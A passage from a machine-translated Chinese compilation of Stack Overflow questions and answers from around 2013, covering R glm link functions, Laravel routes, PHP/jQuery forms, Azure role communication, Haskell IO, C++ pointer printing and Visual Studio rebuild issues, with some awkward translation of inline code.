似乎两者都可以`setOnClickListener()`防止`setOnLongClickListener()`在`onItemClick()`短按时触发，无论`setOnLongClickListener()`返回真还是假。此外，对于要触发的任一子视图`onItemClick()`，应将`RelativeLayout`'s设置为，并且将子视图'应设置为。似乎没有其他任何东西起作用或有任何效果。`android:descendantFocusability``"blocksDescendants"``android:clickable``"false"`

# r - 如何在 glm 中使用自定义链接功能？

> ID：14916700
> 
> 赞同：7
> 
> 时间：2013-02-17T00:21:33.143
> 
> 标签：r, glm

我不想在`glm`泊松回归中使用标准日志链接，因为我有零。考虑以下代码：

```
foo = 0:10
bar = 2 * foo
glm(bar ~ foo, family = poisson(link = "identity")) 
```

我得到错误：

> 错误：未找到有效的系数集：请提供起始值

我不确定这意味着什么。我认为的“身份”链接功能是什么（即它根本不转换数据）？这个错误是什么意思，我该如何解决？

* * *

## 回答 #1

> 赞同：10
> 
> 时间：2013-02-17T00:39:26.963

如果您从默认 (0,0) 起点以外的地方开始，您可以获得答案。该`start`参数是一个向量，包含响应的截距和斜率，在链接函数的范围内。R 报告的问题通常是计算的（负）对数似然对于起始值变得无限。你可以自己检查一下：`-sum(dpois(bar,0+0*foo,log=TRUE))`is `Inf`（因为我们正在设置一个均值为零的泊松，但得到一个非零响应）。

然而，这并不是一个完整的解释，因为即使对于一些起始点，如 (0,2)，其中起始负对数似然是有限的（`-sum(dpois(bar,0+2*foo,log=TRUE))`大约为 20），也会发生同样的错误——人们必须深入研究更深入地了解问题所在，但我可以想象，例如，代码中根本不允许泊松均值为零。泊松的对数似然是（一个常数加号）`x*log(lambda)-lambda`：即使如果`lambda`和`x`都为零，这可以解决，但这在数学中并不总是显而易见的。特别是，如果您查看`poisson()$validmu`，它是`glm`用于确定一组计算的 Poisson 均值是否正常的函数，您会看到它的定义是`function (mu) { all(mu > 0) }`。（可以修改它以允许零值`mu`，但是你需要一个很好的理由来这样做就够麻烦了——我试过了，还有另一个问题，因为方差随后被计算为零。简而言之，通过自定义的最大似然估计器（例如`bbmle::mle2()`）比破解`glm`来做到这一点更容易......）

然而，泊松均值没有零估计的起点效果很好，尽管有很多警告：

```
glm(bar ~ foo, family = poisson(link = "identity"), start=c(1,0)) 
```

**但是**：我想指出您误解了链接功能的目的。即使使用标准对数链接，泊松回归的响应变量也可以为零。泊松回归的 GLM 模型是`y ~ Poisson(exp(a+b*x))`，不是`log(y) = a + b*x`。后者是不好的 if `y=0`，但前者完全没问题。`glm(bar ~ foo, family = poisson())`工作得很好。

一般来说，非规范链接函数有点痛苦：它们有时正是你所需要的（尽管从你所说的我不相信这在你的情况下是真的），但它们往往是比规范链接更麻烦，更难适应。

最后一点：我可能会将您想要的称为“非规范”或“非标准”链接；对我而言，自*定义*链接函数将是`family()`R 中的命令未提供的函数，因此您必须自己编写链接函数（例如，参见[http://rpubs.com/bbolker/4082](http://rpubs.com/bbolker/4082)）

# laravel - 在laravel 4中检索路线名称

> ID：14916704
> 
> 赞同：1
> 
> 时间：2013-02-17T00:22:00.840
> 
> 标签：laravel, routes, laravel-4

是否可以按名称检索路线？

例如，如果我使用如下名称注册一条路线：

```
 Route::get('dashboard', array(
        'as' => 'my_route_name',
        function()
        {
            ...;
        })
    ); 
```

然后稍后，我想检索此路由的 URL。

就像是

```
$myRoute = Route::getRoutebyname("my_route_name");
Redirect::to($myRoute::url()); 
```

谢谢

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-17T05:37:05.913

这可以在 Laravel 4 中完成，尽管它与 Laravel 3 略有不同。

您只需要`redirect`在类上使用函数`Redirect`，而不是`to`函数。

所以，你的看起来像这样：

```
return Redirect::route('my_route_name'); 
```

有关更多信息，请参阅[Laravel 4 路由文档](http://four.laravel.com/docs/routing#named-routes)。

# php - 文本框值不会传递给 javascript 和 php

> ID：14916707
> 
> 赞同：0
> 
> 时间：2013-02-17T00:22:08.420
> 
> 标签：php, javascript, html, textbox, passwords

我有这个代码，他们应该传递vercode的值，但不幸的是它没有这样做......我希望它将代码从文本框传递到javascript和php

这是代码：

## HTML：

```
 <?php
session_start();
?>
<html>
    <title>Adviser Registration</title>
    <head>
    <link rel="shortcut icon" href="favicon.ico" type="image/ico" />
    <script type="text/javascript">
    function upperCase()
        {
            //get ids
            var lname=document.getElementById("lname");
            var fname=document.getElementById("fname");
            var mname=document.getElementById("mname");
            //function
            lname.value=lname.value.toUpperCase();
            fname.value=fname.value.toUpperCase();
            mname.value=mname.value.toUpperCase();
        }
    </script>
    <script language="JavaScript" src="js/gen_validatorv31.js" type="text/javascript"></script>
    <script type="text/javascript" src="http://ajax.googleapis.com/ajax/libs/jquery/1.4.2/jquery.min.js"></script>
    <link rel="stylesheet" type="text/css" href="css/reg.css">
    </head>
    <body>
        <div id="wrapheader">
    </div>
    <div id="wrap">
        <table width="902"  class="tableaccountinfo2" style="border-collapse:collapse; background:url(images/dock-bg.gif)">
            <tr>
                <td width="39" class="picaccount2"></td>
                <td width="851" height="33">Account Info</td>
            </tr>
        </table>

      <table width="898">  
        <tr>
                <td width="30"></td>
                <td width="856" style="color:#060; font-size:12px;"><b>*Note:</b>Please make sure that your account information is a registered email address. This will be used as your Autumn Account and for account validation. </td>
            </tr>
       </table>

        <table width="928" align="center" id="tablereg" style="border-collapse:collapse; font-size:14px;">
             <tr>
                <td height="23">&nbsp;</td>
          </tr>
            <tr>
                <td width="137" height="44">E-mail Address:</td>
      <td width="242"><input type="text" id="email" /></td>
                <td width="505"><span id="email_feedback">&nbsp;</span></td>
            </tr>
            <tr>
                <td height="44">Password:</td>
              <td><input type="password" id="pass" /></td>
            </tr>
            <tr>
                <td height="44">Repeat Password:</td>
            <td><input type="password" id="rpass" /></td>
                <td><span id="pass_av">&nbsp;</span></td>
            </tr>
            <tr>
                <td>&nbsp;</td>
            </tr>
      </table>
      <table id="tablereg" style="width:400px;border-collapse:collapse;font-size:14px;">
             <tr>
                <td>&nbsp;</td>
            </tr>
            <tr>
                <td width="137">Verification Code: </td>
                <td>
                    <input type="password" id="vercode" name="vercode" />
                </td>
            </tr>
            <tr>
                <td>&nbsp;</td>
            </tr>
      </table>

     <!----------------------Personal Info------------------------>
    <table width="902"  class="tableaccountinfo" style="border-collapse:collapse; background:url(images/dock-bg.gif)"  >
            <tr>
            <td width="36" class="picpersonal"></td>
                <td width="854" height="33">
                    Personal Information
                </td>
            </tr>
        </table>
        <table width="899" align="center" id="tablereg" style="border-collapse:collapse;">
             <tr>
                <td height="23">&nbsp;</td>
          </tr>
            <tr>
                <td width="123" height="44">Firstname:</td>
                <td width="765"><input type="text" id="fname" onChange="upperCase()" /></td>
            </tr>
            <tr>
                <td height="44">Middle Name:</td>
                <td><input type="text" id="mname" onChange="upperCase()" /></td>
            </tr>
            <tr>
                <td height="44">Lastname:</td>
                <td><input type="text" id="lname" onChange="upperCase()" /></td>
            </tr>
            <tr>
                <td>&nbsp;</td>
            </tr>
      </table>

       <!----------------------School Info------------------------>

<table width="902"  class="tableaccountinfo" style="border-collapse:collapse; background:url(images/dock-bg.gif)">
            <tr>
             <td width="37" class="picstudentinfo">  </td>
                <td width="853" height="33">
                    School Information
                </td>
            </tr>
        </table>
        <table style="border-collapse:collapse;" align="center" id="tablereg">
             <tr>
                <td height="23" width="125px">&nbsp;</td>
            </tr>
            <tr>
                <td height="44" width="125px">Staff ID:</td>
                <td><input type="text" id="staffid" /></td>
            </tr>
            <tr>
                <td height="44" width="125px">College:</td>
                            <td>
                                <select id="college">
                                <option value="please_select">Select your college...</option>
                                <?php
                                include "connection.php";
                                $getcollege = mysql_query("SELECT * FROM college");
                                while($collrow = mysql_fetch_assoc($getcollege))
                                {
                                    $coll = $collrow['collegeab'];
                                    $collid = $collrow['college_id'];
                                ?>
                                    <option value="<?php echo $collid; ?>"><?php echo $coll; ?></option>
                                <?php
                                }
                                ?>
                                </select>
                            </td>
            </tr>
              <tr>
                <td height="44" width="125px">Coordinator:</td>
                <td id="coorhold">&nbsp;</td>
            </tr>
            <tr>
                <td height="23" width="125px">&nbsp;</td>
          </tr>
      </table>

       <!----------------------Incase you forgot your password------------------------>

     <table width="902"  class="tableaccountinfo" style="border-collapse:collapse; background:url(images/dock-bg.gif)">
            <tr>
                <td width="37" class="picincase"></td>
                <td width="853" height="33">
                    In case you forgot your password
                </td>
            </tr>
        </table>

      <!----------------------Registration Result------------------------>

     <table width="928px"  id="tablereg" style="border-collapse:collapse;">
        <tr>
            <td><span id="regresult">&nbsp;</span></td>
        </tr>
     </table>

     <!----------------------Register Button---------------------->

     <table width="928"  id="tablereg" style="border-collapse:collapse;">
        <tr>
            <td width="224"></td>
            <td width="664"><input type="button" id="submitregister" value="Register" name="submitregister" /></td>
        </tr>
     </table>
    </div>
<script type="text/javascript" src="js/advreg.js"></script>
<script type="text/javascript" src="js/chooseadv.js"></script>
<script language='JavaScript' type='text/javascript'>
function refreshCaptcha()
{
    var img = document.images['captchaimg'];
    img.src = img.src.substring(0,img.src.lastIndexOf("?"))+"?rand="+Math.random()*1000;
}
</script>
    </body>
</html> 
```

* * *

## JAVASCRIPT：

```
$('#submitregister').click(function() {  
    //grab values
    var vercode = $('#vercode').val();

    //show loading text
    $('#regresult').text('Loading...');

    //perform http request
    $.post('validations/vadvreg.php', { vercode: vercode
    }, function(data){
        $('#regresult').html(data);
    });
}); 
```

* * *

## PHP

```
<?php
include 'connection.php';
session_start();

if(isset($_POST['vercode'])){

    $vercode = mysql_real_escape_string(htmlentities($_POST['vercode']));

}else {
    echo "<font color='red'>Please fill in ALL fields!</font>1";
}
?> 
```

* * *

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-17T00:26:59.443

输入必须具有`name`属性，以便在提交表单时作为请求的一部分发送：

```
<input type=password id=vercode name=vercode> 
```

来自 W3C：[http ://www.w3.org/html/wg/drafts/html/master/single-page.html#attr-fe-name](http://www.w3.org/html/wg/drafts/html/master/single-page.html#attr-fe-name)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-02-17T00:34:43.283

[使用 jQuery http://api.jquery.com/jQuery.post/](http://api.jquery.com/jQuery.post/)中指定的 done 命令

```
//perform http request
$.post('validations/vadvreg.php', { vercode: vercode})
.done(function(data){
    $('#regresult').html(data);
}); 
```

# azure - 如何与 Azure 进行角色间通信？

> ID：14916711
> 
> 赞同：3
> 
> 时间：2013-02-17T00:23:06.767
> 
> 标签：azure

我完全不知道如何让 Azure 角色（无论是 Web 角色还是辅助角色）与另一个 Azure 角色进行通信？

我查看了 Service Bus Relays，速度非常可笑——调试时将数据从一个角色获取到另一个角色大约需要 6 个小时。当我通过在云中运行的 Web 服务公开完全相同的数据时，我可以在一分钟内将这些数据下载到我的手机上。荒谬的。我假设数据正在从我的机器发送到云端，然后从那里返回到我的机器。

服务总线中继有一种称为混合的模式，它应该打开直接套接字连接以实现快速通信，但实际上没有关于如何实现这一点的文档。

我已经通过 WCF NetTcpBinding 在一个角色上公开了一项服务，但我不知道如何让另一个角色能够调用它。

我还查看了服务总线队列/订阅，但您可以发送的消息有 256KB 的限制！

我不敢相信缺少文档和教程来解决应该是一个常见场景 - 两个角色之间的快速通信（很可能位于完全相同的物理计算机上！）

非常感谢任何帮助，谢谢！

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-02-17T02:01:59.557

如果您的角色属于同一云服务，则可以通过内部端点访问它们。您可以获取角色和端口的内部 IP 地址并建立 WCF 调用。

这是一个可能有帮助的主题 [http://msdn.microsoft.com/en-us/library/windowsazure/hh180158.aspx](http://msdn.microsoft.com/en-us/library/windowsazure/hh180158.aspx)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-05-08T23:48:23.290

我在这里没有找到任何满意的答案，所以我采取的后续方法是将数据写入sql azure，通过服务总线通知有更新，并让所有订阅者自己从sql中提取更新的数据。它适用于这种特定情况。

尝试通过服务总线发送数据本身速度非常慢。将其用作角色间事件系统（使用服务总线主题/订阅）效果很好。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2014-08-07T14:31:26.497

您是否考虑过使用 Azure 存储？听起来您想将大数据包从一个 VM 发送到另一个 VM。发送数据的一种相对简单的方法是使用存储 Blob 和队列。首先，将数据写入 blob。然后将消息写入队列，指示数据可用的位置（每个接收器都有自己的队列）。然后接收方下载消息并删除 Blob。这比直接套接字连接慢，但也更简单并且是异步的。异步通信是云系统中的一大优势。使用此解决方案，如果接收器因更新而关闭，它将在稍后恢复时收到消息。

# .htaccess - htaccess 中是否支持 MD5？

> ID：14916713
> 
> 赞同：1
> 
> 时间：2013-02-17T00:23:44.987
> 
> 标签：.htaccess, hash, md5

例如，是否有这样的东西`.htaccess`：

```
RewriteRule ^([A-Za-z0-9]+)$ <<do md5 on $1>>.mp3 
```

是否可以？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-02-17T02:38:21.703

据我发现这是不可能的，但是可以在 Apache 中加载模块——一旦你创建了这样的模块，可以在现有的模块中引入 MD5，`mod_rewrite`你可以这样做。
但我必须警告你，你会减慢你的服务器。改用 PHP。

```
if(isset($_GET["file"])) {
   readfile(md5($_GET["file"]).".mp3");  //Outputs the file. Do not use echo file_get_contents.
} 
```

# entity-framework - EF 数据库第一个多对多附加字段

> ID：14916714
> 
> 赞同：1
> 
> 时间：2013-02-17T00:23:53.193
> 
> 标签：entity-framework, database-first, ef-database-first

现在这可能是一个愚蠢的问题，但它让我很头疼。

我想要完成的是让 EF 生成 2 个具有 MM 关系的对象。 `Material`和`Product`。一个产品有很多材料，一种材料可以在多个产品中找到。诀窍是可以测量材料，例如，`kg`我需要知道一种材料在它所在的产品中能容纳多少公斤。注意：材料可以没有产品而存在，产品不能没有材料而存在。

这是我想出的最初设计，但显然行不通。

```
[Material]  [Product]    [MaterialInProduct]
ID  *PK     ID  *PK      ProductID  *FK              __together these two fields are primary key          
Code        Code         MaterialID *FK              for this table
Name        Name         QuantityOfMaterialInProduct 
Price       Quantity
Unit        Unit
Quantity 
```

所以我的问题是，如何正确添加该`QuantityOfMaterialInProduct`字段，因为没有它 DBContext 工具会正确生成所有内容。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-02-17T00:29:08.203

不要让 EF 创建多对多关联，而是自己定义 MaterialInProduct 实体。您可以将其映射为具有由 ProductId 和 MaterialId（具有关联的导航属性）组成的复合键。这样做，您可以轻松添加任何其他字段。

[您可以在此处](http://msdn.microsoft.com/en-us/data/jj591617.aspx)找到有关自定义映射的文档

# php - 升级到php5.5.50A4后调用未定义函数mysql_connect()

> ID：14916716
> 
> 赞同：1
> 
> 时间：2013-02-17T00:24:14.707
> 
> 标签：php, deprecated

我已通过 Windows 二进制文件升级到 PHP 5.5.0Alpha 4：http: [//windows.php.net/qa/](http://windows.php.net/qa/)

php_mysql.dll 在我的 php.ini 中存在且未注释，但它仍然抛出未定义的函数。

使用开发包的原因是为了向一群“开发者”证明 mysql_* 正在这个开发包中正式生成折旧警告。但我不能调用 mysql_* 函数。

```
error_reporting(E_ALL);
 ini_set("display_errors", 1); 
mysql_connect("localhost", "root", "xxx"); 
mysql_select_db("test"); 
```

错误：

```
Fatal error: Call to undefined function mysql_connect() in C:\xampp\htdocs\index.php on line 4 
```

当成功连接到 mysql 数据库时，应该会生成错误。证明：

> *   MySQL 。此扩展现已弃用，当通过 mysql_connect()、mysql_pconnect() 或通过隐式连接建立与数据库的连接时，将生成弃用警告：请改用 MySQLi 或 PDO_MySQL ( [https://wiki.php.net/rfc/ mysql_deprecation](https://wiki.php.net/rfc/mysql_deprecation)）。（亚当）

[https://github.com/php/php-src/blob/php-5.5.0alpha4/NEWS](https://github.com/php/php-src/blob/php-5.5.0alpha4/NEWS)

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-02-17T00:36:04.950

这仍然是一个开发/测试版本，就证明而言应该被视为极具实验性......您应该将它们指向 PHP.net 页面上的任何 mysql_* 扩展，您会注意到折旧警告。

然后继续将它们转发到已经从 PHP 中贬值的函数，例如`ereg()`您会注意到基本相同的红框警告。

就您的错误消息而言，如果您 100% 确定您的扩展程序存在于您的`ext/`文件夹中，并且未从您的 PHP.ini 中注释；并重新启动了你的 apache 服务。然后问题在实际的 .dll 扩展中解决了，因为这是一个实验性/测试版，没有任何东西可以保证 100% 工作......

至于证明；将它们指向 php.net 并将它们链接到 mysql_* 函数和新闻文件。

# java - Java EE 6 CDI 注入提供程序

> ID：14916718
> 
> 赞同：1
> 
> 时间：2013-02-17T00:24:21.693
> 
> 标签：java, cdi, provider

我对何时注入接口的提供者以及何时直接注入接口存在疑问。

1.  应该使用提供程序的适当情况是什么？请举例。
2.  如果接口的范围是`@Dependant`，那么注入器无论如何都会创建一个新对象，如果是这样，我们还需要使用提供者吗？
3.  如果`@New`使用，则创建一个新对象。那我们需要提供者吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-18T02:40:27.510

使用提供者的主要原因之一（尽管您不注入提供者）是对类进行一些配置。另一个很好的理由是如果该类不能作为 CDI bean 使用。

# haskell - Haskell - 如何在 IO 函数中使用纯函数？

> ID：14916721
> 
> 赞同：6
> 
> 时间：2013-02-17T00:24:53.203
> 
> 标签：haskell, io, referential-transparency

如何在 IO 函数中使用纯函数？：-/

例如：我正在读取一个文件（IO 函数），我想通过使用具有引用透明性的纯函数来解析它的上下文，一个字符串。

似乎这样的世界，纯函数和 IO 函数，是分开的。我怎么可能桥接他们？

* * *

## 回答 #1

> 赞同：12
> 
> 时间：2013-02-17T04:49:00.163

最简单的方法是使用`fmap`，它具有以下类型：

```
fmap :: (Functor f) => (a -> b) -> f a -> f b 
```

`IO`implements `Functor`，这意味着我们可以通过替换`IO`for`f`来专门化上述类型：

```
fmap :: (a -> b) -> IO a -> IO b 
```

换句话说，我们采用一些将`a`s 转换为`b`s 的函数，并使用它来更改`IO`动作的结果。例如：

```
getLine :: IO String

>>> getLine
Test<Enter>
Test
>>> fmap (map toUpper) getLine
Test<Enter>
TEST 
```

那里刚刚发生了什么？好吧，`map toUpper`有类型：

```
map toUpper :: String -> String 
```

它接受 a`String`作为参数，并返回 a`String`作为结果。具体来说，它将整个字符串大写。

现在，让我们看一下 的类型`fmap (map toUpper)`：

```
fmap (map toUpper) :: IO String -> IO String 
```

我们已经升级了我们的函数来处理`IO`值。它将`IO`操作的结果转换为返回大写字符串。

我们也可以使用`do`符号来实现这一点，以：

```
getUpperCase :: IO String
getUpperCase = do
    str <- getLine
    return (map toUpper str)

>>> getUpperCase
Test<Enter>
TEST 
```

事实证明，每个 monad 都具有以下属性：

```
fmap f m = do
    x <- m
    return (f x) 
```

换句话说，如果任何类型实现`Monad`了 ，那么它也应该总是能够实现`Functor`，使用上面的定义。事实上，我们总是可以使用 的`liftM`作为默认实现`fmap`：

```
liftM :: (Monad m) => (a -> b) -> m a -> m b
liftM f m = do
    x <- m
    return (f x) 
```

`liftM`与 相同`fmap`，除了专门用于 monad，它不像函子那样通用。

所以如果你想转换一个`IO`动作的结果，你可以使用：

*   `fmap`,
*   `liftM`， 或者
*   `do`符号

这真的取决于你喜欢哪一个。我个人推荐`fmap`。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-02-17T00:51:39.903

You can also consider liftM function from Control.Monad.
A little example to help you (run it into ghci as you are under the IO Monad)

```
$ import Control.Monad -- to emerge liftM
$ import Data.Char     -- to emerge toUpper
$ :t map to Upper -- A pure function
map toUpper :: [Char] -> [Char]
$ :t liftM 
liftM :: Monad m => (a1 -> r) -> m a1 -> m r
$ liftM (map toUpper) getLine 
```

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2013-02-17T00:45:36.940

亚历克斯霍斯曼帮助了我。他说：

“也许我误会了，但这听起来很简单？do {x <- ioFunc; return (pureFunc x)}”

然后我解决了我的问题：

```
import System.IO  
import Data.List

getFirstPart line Nothing = line
getFirstPart line (Just index) = fst $ splitAt index line 

eliminateComment line = 
 getFirstPart line $ elemIndex ';' line

eliminateCarriageReturn line =
 getFirstPart line $ elemIndex '\r' line

eliminateEntersAndComments :: String -> String  
eliminateEntersAndComments text =
 concat $ map mapFunction $ lines text
 where
  mapFunction = (++ " ") . eliminateCarriageReturn . eliminateComment

main = do {
 contents <- readFile "../DWR-operators.txt"; 
 return (eliminateEntersAndComments contents)
} 
```

* * *

## 回答 #4

> 赞同：2
> 
> 时间：2015-06-11T20:00:45.443

实际答案如下：

```
main = do
  **val** <- return (**purefunc** *...arguments...*)
  *...more..actions...*
```

`return`将其包装在适当的 monad 中，以便`do`可以将其分配给**`val`**.

# php - 显示关联表中的信息？

> ID：14916725
> 
> 赞同：0
> 
> 时间：2013-02-17T00:25:28.120
> 
> 标签：php, sql

我正在运行这个运行良好的语句....

```
$sql = "SELECT skill,SUM(quantity) as sum FROM skills
WHERE userid = $userid
GROUP BY skill"; 
```

我的问题是列技能存储来自表机构_技能的值，该表有一个包含技能名称的列。

我想弄清楚如何显示技能的名称而不是存储在技能表中的值？

这是我正在使用的整个代码......

```
<?php
defined( '_JEXEC' ) or die;

$db = JFactory::getDBO();
$user =& JFactory::getUser();
$userid = $user->get('id');

$sql = "SELECT skill,SUM(quantity) as sum FROM skills
WHERE userid = $userid
GROUP BY skill";

$db->setQuery($sql);

$rows = $db->loadObjectList();

?>
<style>
table, td, th
{
    border-bottom:1px solid black;
}
    {
    th
background-color:#000000
color:#FFF
    }

</style>

<table>
<tr>
<th width="195">Skill</th> <th width="195">Total Completed</th>
</tr>
</table>
<table>
<?PHP foreach ($rows as $row): ?>

<tr>

<td width="200"> <?php echo $row->skill?> </td>

<td width="190"> <?php echo $row->sum ?> </td>
</tr>
<?php endforeach ?>
</table> 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-02-17T00:27:41.003

你可以像这样加入那张桌子

```
SELECT as.skillname,
       SUM(s.quantity) as sum 
FROM agency_skills as `as`
left outer join skills as s on s.skill = as.id
WHERE s.userid = $userid
GROUP BY as.skillname 
```

如果您使用 a`left outer join`而不是默认值`inner join`，您会得到表`skill`中不存在的偶数`skills`。

[简化的 SQL Fiddle 演示](http://sqlfiddle.com/#!2/19a8c/2)

# c++ - Cout 不打印指向内存的内容

> ID：14916726
> 
> 赞同：1
> 
> 时间：2013-02-17T00:25:45.260
> 
> 标签：c++, memory, cout

我有以下代码：

```
if (myFile.is_open()) {
    int i = 0;
    while (myFile.good()) {
        char *ptr = &(reinterpret_cast<char*>(&mem[0]))[i];
        myFile.read(ptr, sizeof(struct req));
        cout << ptr << endl;
        i += sizeof(struct req);
    }
} 
```

这里循环中的 cout 似乎什么也没打印，尽管我知道代码肯定是在设置内存，因为如果我做类似的事情，它会打印出正确的值`cout << mem[5]`。基本上，我只想打印`ptr`所指内容的内容。这可能是一个愚蠢的问题，但有人知道这里有什么问题吗？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-02-17T00:30:57.633

`cout << ptr`, 如果`ptr`是 type `char*`，则将其`ptr`视为指向 C 样式字符串（的第一个字符）的指针，并将该字符串的内容打印到但不包括终止`'\0'`空字符。

如果要打印指针值，请转换为`void*`：

```
cout << (void*)ptr << ... 
```

假设您实际上想要打印指针的值，它可能会显示为十六进制内存地址。你的标题是“指针的内容”，它是内存地址（指针对象本身的内容）。相反，如果您想打印指针指向的数据，请更新您的问题以更清楚地说明您要打印的内容和格式。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-02-17T00:29:25.417

`cout << ptr``ptr`将像指向 C 字符串一样打印。因此，如果它碰到一个 NUL 字符，它将停止。例如，如果你尝试`cout << "hello\0world"`，你只会看到`hello`出现。

如果您想查看其内容，请考虑编写内存区域的 hexdump。

# c# - Visual Studio 重建未修改的项目

> ID：14916729
> 
> 赞同：78
> 
> 时间：2013-02-17T00:25:59.243
> 
> 标签：c#, visual-studio-2010, visual-studio, msbuild, ilmerge

因此，正如标题所述，我现在有一个 VS2010 解决方案，其中包含大约 50 个项目。如果我对没有任何引用的“顶级”项目进行更改，那么 VS 仍然会重建所有 50 个项目。我正在运行没有任何附加组件的 Visual Studio 2010 Ultimate。我正在使用 ILMerge 将所有项目合并到一个文件中。

我通过检查较低级别 dll 的时间戳来验证这一点，并看到它们确实被重建，即使它们的代码没有被触及。

我已阅读以下所有回复和评论：

[Visual Studio 2008 不断重建](https://stackoverflow.com/questions/5345784/visual-studio-2008-keeps-rebuilding)

[Visual Studio 不断构建一切](https://stackoverflow.com/questions/2991972/visual-studio-keeps-building-everything)

[我的解决方案中出现了奇怪的 VS2010 构建故障](https://stackoverflow.com/questions/6901683/strange-vs2010-build-glitch-occurs-in-my-solution?lq=1)

[在 Visual Studio 中重建 C# 项目的原因](https://stackoverflow.com/questions/5429781/reasons-for-c-sharp-projects-to-rebuild-in-visual-studio)

但他们中的大多数只是提供关于卸载项目以加快构建时间的建议，但没有具体的修复方法。我试图弄清楚为什么 VS 认为这些依赖项目需要重建而不需要重建并修复它。

我打开了“工具 > 选项 > 项目和解决方案 > 构建和运行 > 仅构建启动项目和运行依赖项”，但没有任何效果。

此外，如果我只是重建一个只有 8 个（内）直接依赖项的“中级”项目，那么即使没有调用 ILMerge 并且没有修改任何依赖项目，它仍然会构建所有 8 个项目。

感谢大家提供的任何见解。

**添加**

为了测试一些建议，我从头开始创建了一个新的 WinForms 项目。然后，我在该解决方案中创建了两个新项目。我将我的两个“最低级别”项目中的所有代码和资源（不是项目文件）复制到两个全新的项目中（我通过将文件和文件夹从资源管理器拖放到 Visual Studio 中的项目中来做到这一点）。

最低的项目，我们称之为**B**，没有引用任何其他项目。下一个项目**A**仅引用了**B。**因此，一旦我将所需的 .NET 和外部程序集引用添加到项目中，就会构建解决方案。

然后我有了新的 WinForm 项目参考**A**并进行了完整构建。所以参考链是：

**WinForm** -> **A** -> **B**

*然后我只*修改了**WinForm** 并进行了标准构建 (F6)。和以前一样，Visual Studio 重建了所有三个项目。

 ***在对项目B**中的源文件进行一些系统性删除后，我发现如果我删除了我的`Resources.Designer.cs`和`Resources.resx`（并注释掉了使用`.Properties.Resources`这些资源对象的代码），那么对**WinForm**的修改将不再重建整个解决方案，只会重建**赢窗体**。

将`Resources.resx`and添加`Resources.Designer.cs`回项目**B**（但将引用的代码注释掉，以便没有使用资源）将重新引入完整的构建行为。

为了查看我的资源文件是否已损坏，我再次删除了它们，然后创建了一个新文件（通过项目属性 -> 资源）并重新添加了与以前相同的资源，即单个 Excel 文件。使用此设置，仍然会进行完全重建。

然后我删除了单个资源，但将资源文件留在了项目**B**中。即使没有添加资源，但资源文件仍在项目中，也会发生完整的（不需要的）重建。

似乎只是将资源文件添加到 (.NET 3.5) 项目将导致 Visual Studio 2010 始终重建该项目。这是错误还是预期/预期的行为？

再次感谢大家！

* * *

## 回答 #1

> 赞同：150
> 
> 时间：2015-04-15T11:40:06.477

打开工具 - 选项，选择项目和解决方案 - 在树中构建和运行，然后将“MSBuild 项目构建输出详细程度”设置为诊断。这将输出构建项目的原因，即

> 项目“ReferencedProject”不是最新的。项目项“c:\some.xml”的“复制到输出目录”属性设置为“始终复制”。

或者

> 项目“MyProject”不是最新的。输入文件 'c:\ReferencedProject.dll' 在输出文件 'c:\MyProject.pdb' 之后被修改。

在这种情况下，修复方法是仅在更新时复制 some.xml。

构建前和构建后事件也可以触发构建。

* * *

## 回答 #2

> 赞同：18
> 
> 时间：2013-02-27T20:30:02.577

虽然我认为这不是一个解决方法，但它是一种适用于我的情况的解决方法......

我最初有 50 个项目中的大约 5 个项目包含一个`Resources`部分。这些项目总是会被重建，因此他们所依赖的任何东西也会被重建。这 5 个项目中的一个是其他 48 个项目引用的“基础”级库，因此我的项目的 96% 每次都会重新构建，即使它不需要它。

我的解决方法是使用依赖注入、接口和专用的“资源”项目。我没有让这 5 个项目引用它们自己的`Resources`对象，而是在每个项目中创建了一个接口来提供所需的资源。然后，需要这些资源的类将需要在构造函数中创建它们的过程中传入该接口（构造函数注入）。

然后，我创建了一个单独的“资源”项目，该项目具有正常的实际资源部分。该项目仅包含资源本身，以及通过接口提供这些资源所需的每个接口的类。该项目将引用具有资源依赖关系的所有其他项目并实现项目所需的接口。

最后，在我没有任何引用的“顶级”项目中（以及实际构建 exe 和我的组合根目录的位置），我引用了“资源”项目，连接了 DI，然后我们就走了。

这意味着每次只会重建两个项目（“资源”和“顶级”），如果我进行部分构建（Shift-F6），那么它们根本不会被重建。

同样，这不是一个很好的解决方法，但是每次构建需要大约 3 分钟才能构建 48 个项目，因此我每天会因不必要的重建而浪费 30 到 90 分钟。重构花了一些时间，但我认为这是一项不错的投资。

这是一个简化的图表。请注意，为了减少混乱，未显示从`Main.exe`到`Proj1`和的依赖关系。`Proj2`

![解决方案示意图](../Images/fba2b9b87d4314f84ecdfac4c7699b7b.png)

通过这种设计，我可以构建`Proj1`或`Proj2`不触发完全重建，因为它们对部分没有任何依赖关系`Resources`。只`Main`知道`Resources`实现。

* * *

## 回答 #3

> 赞同：17
> 
> 时间：2014-04-28T12:08:58.097

当一个项目有一个实际上并不存在的文件时，就会发生这种情况。
该项目无法确定文件是否已更改（因为它不存在），因此它会重新构建。

只需查看项目中的所有文件，然后搜索附近没有可扩展箭头的文件。

* * *

## 回答 #4

> 赞同：10
> 
> 时间：2016-03-20T19:31:22.243

我在 VS 2015 中遇到了同样的问题。

对我来说诀窍是：

1.  一个项目在其他项目箱中引用自己的副本（魔术，是的）。当切换到诊断构建输出（在构建选项中）然后尝试从项目层次结构的顶部一个一个地构建项目时，可以找到这种东西 - 如果您看到即使没有任何更改也可以重建的项目然后看到它参考。
2.  我已将所有项目中的所有“始终复制”文件更改为“如果更新则复制”。基本上，在所有 .csproj 文件中替换`<CopyToOutputDirectory>Always</CopyToOutputDirectory>` 为`<CopyToOutputDirectory>PreserveNewest</CopyToOutputDirectory>`
